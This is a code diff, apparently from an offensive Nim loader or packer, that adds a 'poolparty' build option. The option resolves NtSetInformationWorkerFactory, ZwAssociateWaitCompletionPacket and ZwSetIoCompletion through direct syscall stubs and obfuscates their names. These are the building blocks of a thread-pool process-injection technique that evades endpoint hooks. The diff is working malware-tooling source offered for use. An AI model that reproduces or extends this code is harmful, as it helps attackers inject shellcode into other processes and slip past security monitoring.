@@ -188,6 +188,22 @@ when defined(GetSyscallStub):
 
     var NtReadVirtualMemory: proc(ProcessHandle: HANDLE; BaseAddress: PVOID; Buffer: PVOID; NumberOfBytesToRead: SIZE_T; NumberOfBytesRead: PSIZE_T): NTSTATUS {.stdcall.}
 
+    when defined(poolparty):
+      # NtSetInformationWorkerFactory
+      type myNtSetInformationWorkerFactory = proc(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.stdcall.}
+
+      var NtSetInformationWorkerFactory: proc(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.stdcall.}
+
+      # ZwAssociateWaitCompletionPacket
+      type myZwAssociateWaitCompletionPacket = proc(WaitCopmletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.stdcall.}
+
+      var ZwAssociateWaitCompletionPacket: proc(WaitCopmletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.stdcall.}
+
+      # ZwSetIoCompletion
+      type myZwSetIoCompletion = proc(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.stdcall.}
+
+      var ZwSetIoCompletion: proc(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.stdcall.}
+
     when defined(QueueAPC):
       type myNtQueueApcThread = proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
       var NtQueueApcThread: proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
@@ -440,6 +456,28 @@ let RetrieveSyscallStubs * = """
         syssuccess = GetSyscallStub(obf("NtTestAlert"), cast[LPVOID](syscallStub_NtTestAlert))
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtTestAlert: ") & $syssuccess
+    
+    when defined(poolparty):
+        var syscallStub_NtSetInformationWorkerFactory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (16 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtSetInformationWorkerFactory
+        NtSetInformationWorkerFactory = cast[myNtSetInformationWorkerFactory](cast[LPVOID](syscallStub_NtSetInformationWorkerFactory))
+        syssuccess = GetSyscallStub(obf("NtSetInformationWorkerFactory"), cast[LPVOID](syscallStub_NtSetInformationWorkerFactory))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtSetInformationWorkerFactory: ") & $syssuccess
+
+        var syscallStub_ZwAssociateWaitCompletionPacket: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (17 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define ZwAssociateWaitCompletionPacket
+        ZwAssociateWaitCompletionPacket = cast[myZwAssociateWaitCompletionPacket](cast[LPVOID](syscallStub_ZwAssociateWaitCompletionPacket))
+        syssuccess = GetSyscallStub(obf("ZwAssociateWaitCompletionPacket"), cast[LPVOID](syscallStub_ZwAssociateWaitCompletionPacket))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub ZwAssociateWaitCompletionPacket: ") & $syssuccess
+
+        var syscallStub_ZwSetIoCompletion: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (18 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define ZwSetIoCompletion
+        ZwSetIoCompletion = cast[myZwSetIoCompletion](cast[LPVOID](syscallStub_ZwSetIoCompletion))
+        syssuccess = GetSyscallStub(obf("ZwSetIoCompletion"), cast[LPVOID](syscallStub_ZwSetIoCompletion))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub ZwSetIoCompletion: ") & $syssuccess
 
   
     # get NtFreeVirtualMemory and NtReadVirtualMemory
